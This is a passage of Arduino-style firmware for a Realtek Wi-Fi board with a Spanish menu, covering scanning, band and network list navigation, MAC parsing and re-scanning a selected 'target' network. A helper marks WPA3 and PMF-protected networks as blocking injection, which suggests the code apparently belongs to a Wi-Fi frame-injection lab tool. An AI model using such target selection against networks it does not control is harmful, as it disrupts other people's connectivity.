  while (digitalRead(BTN_OK) == LOW || digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
    delay(20);
  }
}

bool isInjectionBlockedSecurity(uint32_t security) {
  return security == RTW_SECURITY_WPA3_AES_PSK ||
         security == RTW_SECURITY_WPA2_WPA3_MIXED ||
         security == RTW_SECURITY_WPA2_AES_CMAC;
}

bool parseMacAddress(const char *text, uint8_t mac[6]) {
  if (strlen(text) != 17) {
    return false;
  }

  for (uint8_t i = 0; i < 6; i++) {
    int high = hexValue(text[i * 3]);
    int low = hexValue(text[i * 3 + 1]);
    if (high < 0 || low < 0) {
      return false;
    }

    mac[i] = (high << 4) | low;

    if (i < 5 && text[i * 3 + 2] != ':') {
      return false;
    }
  }

  return true;
}

int hexValue(char value) {
  if (value >= '0' && value <= '9') {
    return value - '0';
  }

  if (value >= 'A' && value <= 'F') {
    return value - 'A' + 10;
  }

  if (value >= 'a' && value <= 'f') {
    return value - 'a' + 10;
  }

  return -1;
}

void runTargetRefresh() {
  if (!targetHasSelection()) {
    showPlaceholder("Re-scan", "Sin objetivo aun");
    return;
  }

  char targetBssid[18];
  strncpy(targetBssid, targetGet().bssid, sizeof(targetBssid));
  targetBssid[sizeof(targetBssid) - 1] = '\0';

  if (!labStatsActive() || strcmp(labStatsGet().bssid, targetBssid) != 0) {
    labStatsReset(targetBssid);
  }

  uiDrawStatus("Buscando objetivo...");

  bool scanOk = wifiScannerScan();
  int foundIndex = scanOk ? wifiScannerFindBssid(targetBssid) : -1;

  if (foundIndex >= 0) {
    targetSet(wifiScannerNetwork(foundIndex));
    labStatsAdd(true, &targetGet());
    selectedNetwork = foundIndex;
    selectedBand = wifiScannerIs5GHz(targetGet().channel) ? 5 : 2;
    uiState = UI_TARGET_MONITOR;
    uiDrawTargetMonitor(targetGet(), true);
  } else {
    labStatsAdd(false, NULL);
    uiState = UI_TARGET_MONITOR;
    uiDrawTargetMonitor(targetGet(), false);
  }

  labStatsPrintToSerial();

  delay(250);
}

bool sameTarget(uint8_t networkIndex) {
  if (!targetHasSelection()) {
    return false;
  }

  return strcmp(targetGet().bssid, wifiScannerNetwork(networkIndex).bssid) == 0;
}

void showPlaceholder(const char *title, const char *message) {
  uiState = UI_PLACEHOLDER;
  uiDrawStatus(title);
  delay(500);
  uiDrawStatus(message);
}

void runScan() {
  uiDrawStatus("Escaneando...");

  selectedNetwork = 0;
  listTop = 0;
  uiState = UI_WIFI_MENU;

  if (!wifiScannerScan()) {
    uiDrawStatus("Scan fallo");
    delay(1200);
    drawWifiMenu();
    return;
  }

  selectedBand = wifiScannerCountBand(5) > 0 ? 5 : 2;
  uiState = UI_BAND_MENU;
  uiDrawBandMenu(selectedBand);
}

uint8_t nextIndex(uint8_t current, uint8_t count) {
  return (current + 1) % count;
}

uint8_t previousIndex(uint8_t current, uint8_t count) {
  return current == 0 ? count - 1 : current - 1;
}

uint8_t nextBandOption(uint8_t current) {
  if (current == 5) return 2;
  if (current == 2) return 0;
  return 5;
}

uint8_t previousBandOption(uint8_t current) {
  if (current == 5) return 0;
  if (current == 2) return 5;
  return 2;
}

void moveSelection(int delta) {
  if (wifiScannerCount() == 0) {
    uiDrawStatus("OK para scan");
    delay(250);
    return;
  }

  int bandCount = wifiScannerCountBand(selectedBand);
  if (bandCount == 0) {
    selectedNetwork = -1;
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    delay(180);
    return;
  }

  if (delta > 0) {
    // DOWN
    if (selectedNetwork == -1) {
      for (int i = 0; i < (int)wifiScannerCount(); i++) {
        if (wifiScannerNetworkInBand(i, selectedBand)) {
          selectedNetwork = i;
          break;
        }
      }
    } else {
      int nxt = -2;
      for (int i = selectedNetwork + 1; i < (int)wifiScannerCount(); i++) {
        if (wifiScannerNetworkInBand(i, selectedBand)) {
          nxt = i;
          break;
        }
      }
      selectedNetwork = (nxt == -2) ? -1 : nxt; // wrap a Volver
    }
  } else {
    // UP
    if (selectedNetwork == -1) {
      for (int i = (int)wifiScannerCount() - 1; i >= 0; i--) {
        if (wifiScannerNetworkInBand(i, selectedBand)) {
          selectedNetwork = i;
          break;
        }
      }
    } else {
      int prv = -2;
      for (int i = selectedNetwork - 1; i >= 0; i--) {
        if (wifiScannerNetworkInBand(i, selectedBand)) {
          prv = i;
          break;
        }
      }
      selectedNetwork = (prv == -2) ? -1 : prv; // wrap a Volver
    }
  }

  normalizeListTop();
  uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
  delay(180);
}

void selectFirstNetworkInBand() {
  selectedNetwork = -1; // arranca en Volver si no hay redes
  listTop = 0;

  for (uint8_t i = 0; i < wifiScannerCount(); i++) {
    if (wifiScannerNetworkInBand(i, selectedBand)) {
      selectedNetwork = i;
      listTop = i;
      break;
    }
  }

  uiState = UI_NETWORK_LIST;
}

void normalizeListTop() {
  if (selectedNetwork == -1) {
    for (uint8_t i = 0; i < wifiScannerCount(); i++) {
      if (wifiScannerNetworkInBand(i, selectedBand)) {
        listTop = i;
        return;
      }
    }
    listTop = 0;
    return;
  }

  if (selectedNetwork < listTop) {
    listTop = selectedNetwork;
    return;
  }

  uint8_t rows = 0;
  for (uint8_t i = listTop; i < wifiScannerCount(); i++) {
    if (!wifiScannerNetworkInBand(i, selectedBand)) {
      continue;
    }

    rows++;
    if ((int)i == selectedNetwork) {
      return;
    }

    if (rows >= 4) {
      listTop = selectedNetwork;
      return;
    }
  }
}
